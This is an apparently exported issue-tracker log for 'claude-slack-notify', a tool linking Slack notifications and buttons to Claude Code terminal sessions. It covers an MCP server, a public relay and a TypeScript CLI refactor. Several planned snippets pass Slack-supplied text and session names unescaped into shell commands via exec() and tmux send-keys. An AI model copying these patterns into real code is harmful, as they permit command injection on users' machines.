{"id":"csn-6rd","title":"Create Slack app manifest for faster setup","description":"Create slack-app-manifest.json file that users can use with Slack's 'Create from manifest' flow. Reduces Slack app setup from 10+ clicks to 4 clicks.","status":"closed","priority":3,"issue_type":"task","created_at":"2026-01-19T16:25:23.170203-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:33:59.007908-08:00","closed_at":"2026-01-19T16:33:59.007908-08:00","close_reason":"Created slack-app-manifest.json for faster Slack app setup","dependencies":[{"issue_id":"csn-6rd","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.368086-08:00","created_by":"playerzer0x"}]}
{"id":"csn-82z","title":"Improve claude-slack-notify onboarding experience","status":"closed","priority":1,"issue_type":"epic","created_at":"2026-01-19T16:24:59.155903-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:35:46.157572-08:00","closed_at":"2026-01-19T16:35:46.157572-08:00","close_reason":"All child tasks completed: P0 bugs fixed, jq integration, interactive setup, auto-hooks, manifest, documentation updated"}
{"id":"csn-85v","title":"Auto-merge hooks into settings.json using jq","description":"Instead of showing JSON blob for user to copy, use jq to automatically merge hooks into settings.json. Create backup, deep merge (preserve existing hooks), validate JSON.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T16:25:22.95297-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:33:31.632766-08:00","closed_at":"2026-01-19T16:33:31.632766-08:00","close_reason":"Added jq-based auto-merge with deep hook merging and backup","dependencies":[{"issue_id":"csn-85v","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.361007-08:00","created_by":"playerzer0x"},{"issue_id":"csn-85v","depends_on_id":"csn-r6w","type":"blocks","created_at":"2026-01-19T16:26:14.808499-08:00","created_by":"playerzer0x"}]}
{"id":"csn-85x","title":"Add --public-relay flag to remote-tunnel","description":"Add --public-relay flag to bin/remote-tunnel. Same registration logic as local-tunnel. Allows remote servers to use public relay instead of their own Tailscale Funnel. See docs/public-relay-plan.md Phase 2.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:46.662645821-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:46.662645821-08:00","dependencies":[{"issue_id":"csn-85x","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:24:02.042059086-08:00","created_by":"playerzer0x"},{"issue_id":"csn-85x","depends_on_id":"csn-5iv","type":"blocks","created_at":"2026-01-23T12:24:09.931017129-08:00","created_by":"playerzer0x"},{"issue_id":"csn-85x","depends_on_id":"csn-8oi","type":"blocks","created_at":"2026-01-23T12:31:39.439440959-08:00","created_by":"playerzer0x"}]}
{"id":"csn-8gp","title":"Implement focus-executor library","description":"lib/focus-executor.ts - Spawn existing focus-helper script, build claude-focus:// URL from session + action, handle errors gracefully","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:40.341484-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:35:26.427643-08:00","closed_at":"2026-01-19T14:35:26.427643-08:00","close_reason":"Implemented focus-executor with buildFocusUrl and executeFocus functions, including 11 passing tests","dependencies":[{"issue_id":"csn-8gp","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.453714-08:00","created_by":"playerzer0x"},{"issue_id":"csn-8gp","depends_on_id":"csn-8jg","type":"blocks","created_at":"2026-01-19T14:25:10.696537-08:00","created_by":"playerzer0x"}]}
{"id":"csn-8jg","title":"Create MCP server package structure","description":"Create mcp-server/ subdirectory with package.json (deps: @modelcontextprotocol/sdk, express, zod) and tsconfig.json for TypeScript","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:39.618225-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:31:03.382065-08:00","closed_at":"2026-01-19T14:31:03.382065-08:00","close_reason":"Created mcp-server/ with package.json, tsconfig.json, and directory structure. Deps installed.","dependencies":[{"issue_id":"csn-8jg","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.426792-08:00","created_by":"playerzer0x"}]}
{"id":"csn-8jz","title":"Add --public-relay flag to local-tunnel","description":"Add --public-relay flag to bin/local-tunnel. Read relay URL from ~/.claude/.public-relay-url and API key from ~/.claude/.public-relay-key. Register on startup, heartbeat every 30s, unregister on shutdown. See docs/public-relay-plan.md Phase 2.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:42.66632019-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:42.66632019-08:00","dependencies":[{"issue_id":"csn-8jz","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:24:02.024706563-08:00","created_by":"playerzer0x"},{"issue_id":"csn-8jz","depends_on_id":"csn-5iv","type":"blocks","created_at":"2026-01-23T12:24:09.915571079-08:00","created_by":"playerzer0x"},{"issue_id":"csn-8jz","depends_on_id":"csn-8oi","type":"blocks","created_at":"2026-01-23T12:31:39.418615832-08:00","created_by":"playerzer0x"}]}
{"id":"csn-8oi","title":"Add relay request verification to MCP server","description":"CRITICAL: Update mcp-server/src/routes/slack.ts to verify X-Relay-Secret header on incoming requests. Load secret from ~/.claude/.relay-tunnel-secret. Skip verification for direct Slack requests (when secret not configured). See docs/public-relay-plan.md Local MCP Server Verification section.","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-23T12:31:20.73726734-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:31:20.73726734-08:00","dependencies":[{"issue_id":"csn-8oi","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:31:31.484203927-08:00","created_by":"playerzer0x"},{"issue_id":"csn-8oi","depends_on_id":"csn-5jh","type":"blocks","created_at":"2026-01-23T12:31:35.462942903-08:00","created_by":"playerzer0x"}]}
{"id":"csn-8wn","title":"[Phase 0] Create E2E test runner and lib","description":"# E2E Test Infrastructure - Runner and Lib\n\n## Files to Create\n\n```\ntests/e2e/\n├── run-tests.sh              # Orchestrator\n├── lib/\n│   ├── setup.sh              # Start test fixtures\n│   ├── teardown.sh           # Cleanup\n│   ├── assertions.sh         # Test helpers (assert_equals, assert_contains, etc.)\n│   └── mock-slack-server.ts  # Bun server for Slack simulation\n```\n\n## run-tests.sh Features\n- Accept target: `./run-tests.sh linux|mac|cross-machine|all`\n- Colored output for pass/fail\n- Summary at end\n- Exit code reflects test results\n- Skip tests if dependencies missing (e.g., Mac tests skip on Linux)\n\n## lib/assertions.sh\n```bash\nassert_equals() { ... }\nassert_contains() { ... }\nassert_less_than() { ... }\nassert_exit_code() { ... }\nassert_file_exists() { ... }\nassert_log_contains() { ... }\n```\n\n## lib/mock-slack-server.ts\n```typescript\n// Bun server that:\n// - Captures webhook POSTs to /webhook\n// - Simulates button clicks via /simulate-button\n// - Returns captured notifications via /notifications\n// - Runs on port 9999\n```\n\n## lib/setup.sh\n- Start mock-slack-server in background\n- Create test tmux sessions\n- Set up test instance files\n\n## lib/teardown.sh\n- Kill mock-slack-server\n- Clean up test tmux sessions\n- Remove test instance files\n\n## Acceptance Criteria\n- [ ] `run-tests.sh linux` runs without error (even if no tests yet)\n- [ ] mock-slack-server starts and captures webhooks\n- [ ] assertions.sh provides all needed helpers\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":1,"issue_type":"task","created_at":"2026-01-24T07:56:23.34810282-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:56:23.34810282-08:00"}
{"id":"csn-90m","title":"LOW: Incomplete URL encoding function","description":"The url_encode function in bin/claude-slack-notify:18-20 only encodes /, :, and .\n\n**Risk**: Characters like \u0026, #, ?, spaces are not encoded, potentially breaking URLs.\n\n**Fix**: Use a proper URL encoding function or: python3 -c \"import urllib.parse; print(urllib.parse.quote('$1'))\"","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-01-18T14:59:00.944669-08:00","created_by":"playerzer0x","updated_at":"2026-01-18T15:09:45.144677-08:00","closed_at":"2026-01-18T15:09:45.144677-08:00","close_reason":"Replaced simple sed-based url_encode with proper implementation that encodes all non-alphanumeric chars except -_.~. Updated url_decode in focus-helper to use printf '%b' for proper hex decoding. Both functions now handle spaces, \u0026, #, ?, and other special characters correctly."}
{"id":"csn-av4","title":"Implement MCP server core (server.ts)","description":"Express app with express.urlencoded() for Slack payloads, StreamableHTTPServerTransport at /mcp, health endpoint at /health","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:39.797993-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:33:07.639688-08:00","closed_at":"2026-01-19T14:33:07.639688-08:00","close_reason":"Implemented server.ts with Express, MCP StreamableHTTPServerTransport, health endpoint at /health, placeholder /slack/actions, and /mcp endpoint with session management","dependencies":[{"issue_id":"csn-av4","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.434083-08:00","created_by":"playerzer0x"},{"issue_id":"csn-av4","depends_on_id":"csn-8jg","type":"blocks","created_at":"2026-01-19T14:25:10.753421-08:00","created_by":"playerzer0x"}]}
{"id":"csn-ay1","title":"[Phase 2] Create TypeScript CLI structure","description":"# TypeScript CLI Structure\n\n## Goal\nSet up CLI project structure with Bun and commander.\n\n## Files to Create\n\n```\ncli/\n├── src/\n│   ├── index.ts                 # Entry point with commander\n│   ├── commands/\n│   │   └── .gitkeep\n│   ├── lib/\n│   │   └── .gitkeep\n│   └── adapters/\n│       └── .gitkeep\n├── package.json\n├── tsconfig.json\n└── bun.lock\n```\n\n## package.json\n```json\n{\n  \"name\": \"claude-notify-cli\",\n  \"version\": \"2.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"build\": \"bun build src/index.ts --compile --outfile ../bin/claude-notify\",\n    \"dev\": \"bun run src/index.ts\",\n    \"test\": \"bun test\",\n    \"typecheck\": \"tsc --noEmit\"\n  },\n  \"dependencies\": {\n    \"commander\": \"^12.0.0\"\n  },\n  \"devDependencies\": {\n    \"@types/bun\": \"latest\",\n    \"typescript\": \"^5.0.0\"\n  }\n}\n```\n\n## src/index.ts\n```typescript\n#!/usr/bin/env bun\nimport { Command } from 'commander';\n\nconst program = new Command();\n\nprogram\n  .name('claude-notify')\n  .description('Slack notifications for Claude Code')\n  .version('2.0.0');\n\nprogram\n  .command('register')\n  .description('Register current session')\n  .action(() =\u003e {\n    console.log('TODO: implement register');\n  });\n\nprogram\n  .command('notify')\n  .description('Send notification')\n  .option('-m, --message \u003ctext\u003e', 'Notification message')\n  .action((opts) =\u003e {\n    console.log('TODO: implement notify', opts);\n  });\n\n// ... stub all commands\n\nprogram.parse();\n```\n\n## Acceptance Criteria\n- [ ] `bun run dev register` prints stub message\n- [ ] `bun run dev notify -m \"test\"` prints stub message\n- [ ] `bun run build` creates bin/claude-notify binary\n- [ ] `./bin/claude-notify --help` shows all commands\n- [ ] TypeScript compiles without errors\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:57:38.615610086-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:57:38.615610086-08:00"}
{"id":"csn-c4x","title":"Create public-relay Express server with forwarding logic","description":"Create public-relay/ directory with Node.js/Express server. Endpoints: POST /register (tunnel URL + API key), POST /slack/actions (forward button clicks), POST /slack/events (forward thread replies), GET /health. See docs/public-relay-plan.md Phase 1.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:20.532940963-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:20.532940963-08:00","dependencies":[{"issue_id":"csn-c4x","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:23:58.054084767-08:00","created_by":"playerzer0x"}]}
{"id":"csn-c8z","title":"Update install.sh for MCP server","description":"Build MCP server during install, create launcher script (bin/mcp-server), optionally create LaunchAgent to replace focus-watcher","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:46.917779-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:45:02.490246-08:00","closed_at":"2026-01-19T14:45:02.490246-08:00","close_reason":"Install.sh updated with MCP server build, bin/mcp-server launcher created","dependencies":[{"issue_id":"csn-c8z","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.474319-08:00","created_by":"playerzer0x"},{"issue_id":"csn-c8z","depends_on_id":"csn-gd0","type":"blocks","created_at":"2026-01-19T14:25:11.656033-08:00","created_by":"playerzer0x"},{"issue_id":"csn-c8z","depends_on_id":"csn-on2","type":"blocks","created_at":"2026-01-19T14:25:11.716791-08:00","created_by":"playerzer0x"}]}
{"id":"csn-crr","title":"Add API key authentication for registration","description":"Implement API key validation middleware. Each API key authorizes specific Slack App IDs. Keys stored in Redis or config. POST /register requires valid Authorization: Bearer header. See docs/public-relay-plan.md Security Model section.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:29.185527549-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:29.185527549-08:00","dependencies":[{"issue_id":"csn-crr","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:23:58.085899769-08:00","created_by":"playerzer0x"},{"issue_id":"csn-crr","depends_on_id":"csn-cxp","type":"blocks","created_at":"2026-01-23T12:24:06.267568587-08:00","created_by":"playerzer0x"}]}
{"id":"csn-crx","title":"Update install.sh with public relay configuration option","description":"Add optional step to install.sh to configure public relay. Prompt for relay URL and API key. Save to ~/.claude/.public-relay-url and ~/.claude/.public-relay-key. See docs/public-relay-plan.md Phase 3.","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-23T12:23:50.456182776-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:50.456182776-08:00","dependencies":[{"issue_id":"csn-crx","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:24:02.057703896-08:00","created_by":"playerzer0x"},{"issue_id":"csn-crx","depends_on_id":"csn-8jz","type":"blocks","created_at":"2026-01-23T12:24:09.946870503-08:00","created_by":"playerzer0x"},{"issue_id":"csn-crx","depends_on_id":"csn-85x","type":"blocks","created_at":"2026-01-23T12:24:09.964193852-08:00","created_by":"playerzer0x"}]}
{"id":"csn-cxp","title":"Add Redis tenant registry with TTL expiration","description":"Add Redis client for tenant registry. Store tenant:APP_ID -\u003e tunnel_url mappings. TTL of 60s, refreshed by heartbeat. See docs/public-relay-plan.md Registry Schema section.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:24.747368849-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:24.747368849-08:00","dependencies":[{"issue_id":"csn-cxp","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:23:58.070152635-08:00","created_by":"playerzer0x"},{"issue_id":"csn-cxp","depends_on_id":"csn-c4x","type":"blocks","created_at":"2026-01-23T12:24:06.251466899-08:00","created_by":"playerzer0x"}]}
{"id":"csn-dpx","title":"Add structured JSON logging for observability","description":"Add structured logging to relay for debugging and audit. Log: timestamp, event type, app_id, action, tunnel_domain (not full URL), response_status, latency_ms. Railway captures stdout as logs. See docs/public-relay-plan.md Security Model section 4.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:31:16.827363172-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:31:16.827363172-08:00","dependencies":[{"issue_id":"csn-dpx","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:31:31.4633722-08:00","created_by":"playerzer0x"},{"issue_id":"csn-dpx","depends_on_id":"csn-c4x","type":"blocks","created_at":"2026-01-23T12:31:35.442170405-08:00","created_by":"playerzer0x"}]}
{"id":"csn-evj","title":"Add offline handling - return error when tunnel unreachable","description":"When forwarding to user's tunnel fails (timeout/unreachable), return ephemeral Slack message: 'Session offline. Your Mac may be asleep.' See docs/public-relay-plan.md Offline Handling section.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-23T12:23:34.138683099-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:34.138683099-08:00","dependencies":[{"issue_id":"csn-evj","depends_on_id":"csn-ogx","type":"parent-child","created_at":"2026-01-23T12:23:58.100720808-08:00","created_by":"playerzer0x"},{"issue_id":"csn-evj","depends_on_id":"csn-c4x","type":"blocks","created_at":"2026-01-23T12:24:06.282354393-08:00","created_by":"playerzer0x"}]}
{"id":"csn-g0a","title":"Simplify slack-notify.md skill instructions","description":"Update commands/slack-notify.md to reflect that webhook and hooks are now set up during install. Less manual steps for users to follow.","status":"closed","priority":3,"issue_type":"task","created_at":"2026-01-19T16:25:31.615791-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:35:18.075639-08:00","closed_at":"2026-01-19T16:35:18.075639-08:00","close_reason":"Updated skill to note that install.sh handles setup","dependencies":[{"issue_id":"csn-g0a","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.382231-08:00","created_by":"playerzer0x"},{"issue_id":"csn-g0a","depends_on_id":"csn-654","type":"blocks","created_at":"2026-01-19T16:26:14.463346-08:00","created_by":"playerzer0x"},{"issue_id":"csn-g0a","depends_on_id":"csn-85v","type":"blocks","created_at":"2026-01-19T16:26:14.524786-08:00","created_by":"playerzer0x"}]}
{"id":"csn-gd0","title":"Implement MCP tools (list_sessions, get_session, send_input)","description":"list_sessions: Read ~/.claude/instances/*.json. get_session: Get single session by ID/name. send_input: Execute focus-helper with action","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:40.175305-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:38:38.076883-08:00","closed_at":"2026-01-19T14:38:38.076883-08:00","close_reason":"Implemented list_sessions, get_session, send_input MCP tools. Files created/modified: src/tools/index.ts (new), src/server.ts (updated). Typecheck passes for implementation files; pre-existing test file has unrelated errors.","dependencies":[{"issue_id":"csn-gd0","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.447435-08:00","created_by":"playerzer0x"},{"issue_id":"csn-gd0","depends_on_id":"csn-av4","type":"blocks","created_at":"2026-01-19T14:25:11.192053-08:00","created_by":"playerzer0x"},{"issue_id":"csn-gd0","depends_on_id":"csn-jmg","type":"blocks","created_at":"2026-01-19T14:25:11.271121-08:00","created_by":"playerzer0x"}]}
{"id":"csn-jmg","title":"Implement session-store library","description":"lib/session-store.ts - Read and parse ~/.claude/instances/*.json files for session management","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:40.522591-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:32:41.760376-08:00","closed_at":"2026-01-19T14:32:41.760376-08:00","close_reason":"Implemented session-store library with listSessions and getSession functions. Includes Session interface, hostname filtering, sorting by registered_at, and comprehensive tests.","dependencies":[{"issue_id":"csn-jmg","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.460472-08:00","created_by":"playerzer0x"},{"issue_id":"csn-jmg","depends_on_id":"csn-8jg","type":"blocks","created_at":"2026-01-19T14:25:10.63381-08:00","created_by":"playerzer0x"}]}
{"id":"csn-k7w","title":"Add inline macOS permission explanation during install","description":"Show explanation BEFORE ClaudeFocus.app is installed explaining why automation permissions are needed and what they do. Reduces user confusion/fear when permission dialogs appear.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T16:25:22.41065-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:31:19.386644-08:00","closed_at":"2026-01-19T16:31:19.386644-08:00","close_reason":"Added permission explanation before ClaudeFocus.app install","dependencies":[{"issue_id":"csn-k7w","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.347878-08:00","created_by":"playerzer0x"}]}
{"id":"csn-m64","title":"[Phase 2] Implement CLI commands","description":"# CLI Commands\n\n## Files to Create\n\n```\ncli/src/commands/\n├── register.ts     # Session registration\n├── notify.ts       # Send notification\n├── launch.ts       # Start tmux session with Claude\n├── remote.ts       # SSH session linking\n├── status.ts       # System status\n└── clean.ts        # Cleanup stale sessions\n```\n\n## register.ts\nPort from bash `claude-slack-notify` lines ~1680-1900:\n- Detect terminal type\n- Generate instance name (adjective-animal-color-noun)\n- Create instance file in ~/.claude/instances/\n- Handle re-registration (preserve existing name)\n- Acquire session lock\n\n```typescript\nexport async function register(opts: { name?: string }) {\n  const session = detectTerminal();\n  const instanceId = process.env.CLAUDE_INSTANCE_ID || process.ppid.toString();\n  \n  // Check for existing registration with same term_target\n  const existing = await findExistingInstance(session.termTarget);\n  const instanceName = opts.name || existing?.name || generateInstanceName();\n  \n  // Write instance file\n  await writeInstanceFile(instanceId, {\n    name: instanceName,\n    term_type: session.termType,\n    term_target: session.termTarget,\n    focus_url: session.focusUrl,\n    registered_at: new Date().toISOString(),\n  });\n  \n  console.log(`Registered as: ${instanceName}`);\n}\n```\n\n## notify.ts\nPort from bash `claude-slack-notify` notify logic:\n- Read instance file\n- Format message with slack-formatter\n- Build buttons with button-value\n- POST to Slack webhook or API\n\n```typescript\nexport async function notify(opts: { message?: string; context?: string }) {\n  const instance = await getCurrentInstance();\n  const buttons = buildButtons(instance.focusUrl);\n  \n  // Use webhook or chat.postMessage based on config\n  if (config.botToken) {\n    await postWithThreading(instance, opts.message, buttons);\n  } else {\n    await postWebhook(opts.message, buttons);\n  }\n}\n```\n\n## launch.ts\nPort from bash `claude-slack-notify launch`:\n- Capture iTerm session ID BEFORE creating tmux\n- Create tmux session\n- Set environment variables in tmux\n- Start Claude inside tmux\n\n```typescript\nexport async function launch(opts: { name?: string }) {\n  // Capture iTerm session ID (critical for focus)\n  const itermSessionId = process.env.ITERM_SESSION_ID || \n    await captureItermSessionId();\n  \n  const sessionName = opts.name || generateSessionName();\n  \n  // Create tmux session\n  await exec(`tmux new-session -d -s \"${sessionName}\"`);\n  \n  // Set env vars (for detect_terminal later)\n  await exec(`tmux set-environment -t \"${sessionName}\" CLAUDE_TMUX_SESSION \"${sessionName}:0.0\"`);\n  if (itermSessionId) {\n    await exec(`tmux set-environment -t \"${sessionName}\" CLAUDE_ITERM_SESSION_ID \"${itermSessionId}\"`);\n  }\n  \n  // Attach (starts Claude inside)\n  await exec(`tmux attach -t \"${sessionName}\"`);\n}\n```\n\n## remote.ts, status.ts, clean.ts\nSimilar ports from existing bash code.\n\n## Acceptance Criteria\n- [ ] `claude-notify register` creates instance file\n- [ ] `claude-notify notify -m \"Test\"` sends to Slack\n- [ ] `claude-notify launch` creates tmux session with env vars\n- [ ] `claude-notify remote` connects to remote with session linking\n- [ ] `claude-notify status` shows system overview\n- [ ] `claude-notify clean` removes stale instances\n- [ ] All commands pass E2E tests\n\n## Dependencies\n- csn-ay1 (CLI structure)\n- csn-641 (lib modules)\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:58:18.938213778-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:58:18.938213778-08:00","dependencies":[{"issue_id":"csn-m64","depends_on_id":"csn-641","type":"blocks","created_at":"2026-01-24T07:59:21.593530666-08:00","created_by":"playerzer0x"}]}
{"id":"csn-mgx","title":"Fix Terminal.app focus targeting wrong tab","description":"Terminal.app detection (lines 222, 536) uses 'selected tab of front window' which gets whatever tab is active, not Claude's tab. Fix: use 'tty' command to get the actual shell's TTY.","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-19T16:25:10.187295-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T16:29:47.565551-08:00","closed_at":"2026-01-19T16:29:47.565551-08:00","close_reason":"Fixed","dependencies":[{"issue_id":"csn-mgx","depends_on_id":"csn-82z","type":"parent-child","created_at":"2026-01-19T16:26:02.334159-08:00","created_by":"playerzer0x"}]}
{"id":"csn-ogx","title":"Public Relay Service","description":"Implement a public hosted MCP relay that routes Slack webhooks to user terminals. Allows users without their own servers to use claude-slack-notify. See docs/public-relay-plan.md for full design.","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-23T12:23:16.035829278-08:00","created_by":"playerzer0x","updated_at":"2026-01-23T12:23:16.035829278-08:00"}
{"id":"csn-ohz","title":"v2.0 Refactor: TypeScript CLI + Consolidated Tunnels","description":"# claude-slack-notify v2.0 Refactor\n\n## Goal\nReduce 10,000 lines of bash to ~2,500 lines TypeScript + 500 lines bash (focus-helper only)\n\n## Key Principles\n1. **DO NOT CHANGE** battle-tested terminal interaction:\n   - Gastown pattern (Escape + Enter for tmux input)\n   - Focus minimization approach (minimize other windows before focusing)\n   - iTerm session ID in URLs\n   - System Events key code 36 for Enter\n\n2. **E2E tests FIRST** - Create test harness before refactoring\n\n3. **TypeScript for logic, Bash for AppleScript** - focus-helper stays bash\n\n## Phases\n- Phase 0: E2E Test Infrastructure\n- Phase 1: Consolidate Tunnels (highest ROI)\n- Phase 2: TypeScript CLI Core\n- Phase 3: focus-helper cleanup (minimal)\n- Phase 4: Unified Binary compilation\n\n## Line Count Projection\n| Component | Before | After | Reduction |\n|-----------|--------|-------|-----------|\n| claude-slack-notify | 3,242 bash | 1,200 TS | 63% |\n| local-tunnel + remote-tunnel | 3,582 bash | 1,500 bash | 58% |\n| focus-helper | 947 bash | 750 bash | 21% |\n| MCP server | 1,990 TS | 1,500 TS | 25% |\n| **Total** | **9,761** | **4,950** | **49%** |\n\n## Reference\nSee conversation for full plan with dialectical critic feedback.","status":"open","priority":1,"issue_type":"epic","created_at":"2026-01-24T07:56:10.017753784-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:56:10.017753784-08:00"}
{"id":"csn-on2","title":"Implement Slack actions endpoint","description":"routes/slack.ts - Parse payload form field (URL-encoded JSON), extract action_id and value from block_actions, call focus-executor, return 200 OK within 3 seconds","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-19T14:24:39.990844-08:00","created_by":"playerzer0x","updated_at":"2026-01-19T14:38:37.972767-08:00","closed_at":"2026-01-19T14:38:37.972767-08:00","close_reason":"Implemented Slack actions endpoint with button payload parsing","dependencies":[{"issue_id":"csn-on2","depends_on_id":"csn-65z","type":"parent-child","created_at":"2026-01-19T14:24:59.440849-08:00","created_by":"playerzer0x"},{"issue_id":"csn-on2","depends_on_id":"csn-av4","type":"blocks","created_at":"2026-01-19T14:25:10.936689-08:00","created_by":"playerzer0x"},{"issue_id":"csn-on2","depends_on_id":"csn-8gp","type":"blocks","created_at":"2026-01-19T14:25:10.99538-08:00","created_by":"playerzer0x"}]}
{"id":"csn-q73","title":"[Phase 2] Implement terminal adapters","description":"# Terminal Adapters\n\n## Goal\nCreate platform-specific adapters that call focus-helper (bash) for actual terminal interaction.\n\n**Key principle**: Complex AppleScript stays in focus-helper (bash). Adapters just invoke it.\n\n## Files to Create\n\n```\ncli/src/adapters/\n├── terminal-adapter.ts     # Interface definition\n├── focus-helper-runner.ts  # Spawn focus-helper subprocess\n├── iterm2-adapter.ts       # iTerm2 via focus-helper\n├── terminal-app-adapter.ts # Terminal.app via focus-helper\n└── tmux-adapter.ts         # Direct tmux commands\n```\n\n## terminal-adapter.ts\n```typescript\nexport interface TerminalAdapter {\n  /**\n   * Focus the terminal window/session\n   */\n  focus(target: string): Promise\u003cvoid\u003e;\n  \n  /**\n   * Send input text to the terminal\n   * Uses gastown pattern for tmux (preserved behavior)\n   */\n  sendInput(target: string, text: string): Promise\u003cvoid\u003e;\n}\n```\n\n## focus-helper-runner.ts\n```typescript\nimport { spawn } from 'bun';\n\nconst FOCUS_HELPER = `${process.env.HOME}/.claude/bin/focus-helper`;\n\nexport async function runFocusHelper(focusUrl: string): Promise\u003cvoid\u003e {\n  const proc = spawn([FOCUS_HELPER, focusUrl], {\n    stdout: 'inherit',\n    stderr: 'inherit',\n  });\n  \n  const exitCode = await proc.exited;\n  if (exitCode !== 0) {\n    throw new Error(`focus-helper exited with code ${exitCode}`);\n  }\n}\n\nexport async function sendInputViaFocusHelper(\n  focusUrl: string, \n  text: string\n): Promise\u003cvoid\u003e {\n  // Append ?text= query param\n  const url = `${focusUrl}?text=${encodeURIComponent(text)}`;\n  return runFocusHelper(url);\n}\n```\n\n## tmux-adapter.ts\n```typescript\n// Direct tmux interaction for non-Mac or when focus-helper not needed\n\nexport class TmuxAdapter implements TerminalAdapter {\n  private socket: string;\n  \n  constructor() {\n    // Platform-specific socket path (PRESERVED)\n    const uid = process.getuid?.() || 501;\n    this.socket = process.platform === 'darwin'\n      ? `/private/tmp/tmux-${uid}/default`\n      : `/tmp/tmux-${uid}/default`;\n  }\n  \n  async focus(target: string): Promise\u003cvoid\u003e {\n    // tmux select-window, etc.\n  }\n  \n  async sendInput(target: string, text: string): Promise\u003cvoid\u003e {\n    // GASTOWN PATTERN - PRESERVED EXACTLY\n    await exec(`tmux -S \"${this.socket}\" send-keys -t \"${target}\" -l \"${text}\"`);\n    await sleep(500);\n    await exec(`tmux -S \"${this.socket}\" send-keys -t \"${target}\" Escape`);\n    await sleep(100);\n    await exec(`tmux -S \"${this.socket}\" send-keys -t \"${target}\" Enter`);\n  }\n}\n```\n\n## Acceptance Criteria\n- [ ] Adapters call focus-helper for Mac terminal operations\n- [ ] TmuxAdapter implements gastown pattern EXACTLY as documented\n- [ ] Platform-specific tmux socket paths preserved\n- [ ] All E2E tests pass (especially test-gastown-pattern.sh)\n\n## Dependencies\n- csn-ay1 (CLI structure)\n- csn-641 (lib modules)\n\n## DO NOT CHANGE\n- Gastown pattern timing (500ms, 100ms delays)\n- tmux socket paths\n- focus-helper invocation interface\n\n## Part of Epic\ncsn-ohz (v2.0 Refactor)","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-24T07:58:36.516028546-08:00","created_by":"playerzer0x","updated_at":"2026-01-24T07:58:36.516028546-08:00","dependencies":[{"issue_id":"csn-q73","depends_on_id":"csn-641","type":"blocks","created_at":"2026-01-24T07:59:21.613567699-08:00","created_by":"playerzer0x"}]}
